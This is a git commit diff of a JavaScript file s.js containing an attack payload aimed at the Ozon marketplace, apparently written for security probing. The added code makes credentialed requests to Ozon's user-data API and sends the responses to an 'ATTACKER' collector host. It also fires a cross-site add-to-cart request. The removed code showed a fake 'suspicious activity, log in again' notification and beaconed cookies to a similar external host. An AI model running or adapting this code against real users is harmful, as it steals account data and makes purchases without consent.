e3931c218f91acd69b92330b132d276618620e15
GMchik <chupanovgadji@gmail.com>
2026-02-27 11:21:12 +0300

    Update s.js

--- s.js
+++ s.js
@@ -1,19 +1,40 @@
-alert('new_3');
+alert('new_4');
 
-ozonApp.showNotification(JSON.stringify({
-    title: "Подтвердите вход",
-    message: "Обнаружена подозрительная активность. Войдите заново",
-}));
+var ATTACKER = 'https://dm3pjhjkpudpos6lmt41kc90xr3iref3.oastify.com';
 
-var f = document.createElement('iframe');
-f.style = 'width:100%;height:100%';
-f.src = 'https://www.ozon.ru/my/main';
-document.body.appendChild(f);
-f.onload = function() {
-    try {
-        var c = f.contentDocument.cookie;
-        navigator.sendBeacon('https://nxozuruu04ozz2hvx3fbvmka81es2nqc.oastify.com/', c);
-    } catch(e) {
-        navigator.sendBeacon('https://nxozuruu04ozz2hvx3fbvmka81es2nqc.oastify.com/?sop', e.message);
-    }
-};
+fetch('https://api.ozon.ru/composer-api.bx/_action/getUserV2', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({}),
+    credentials: 'include'
+})
+.then(function(r) {
+    navigator.sendBeacon(ATTACKER + '?cors=ok&status=' + r.status);
+    return r.text();
+})
+.then(function(text) {
+    navigator.sendBeacon(ATTACKER + '/data', text);
+})
+.catch(function(err) {
+    navigator.sendBeacon(ATTACKER + '?cors=blocked&err=' + encodeURIComponent(err.toString()));
+
+    fetch('https://api.ozon.ru/composer-api.bx/_action/v2/addToCart', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ items: [{ id: 153560750, quantity: 1 }] }),
+        credentials: 'include',
+        mode: 'no-cors'
+    }).then(function() {
+        navigator.sendBeacon(ATTACKER + '?cart=fired');
+    });
+
+    fetch('https://api.ozon.ru/composer-api.bx/_action/getUserV2', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({}),
+        credentials: 'include',
+        mode: 'no-cors'
+    }).then(function() {
+        navigator.sendBeacon(ATTACKER + '?userreq=fired');
+    });
+});
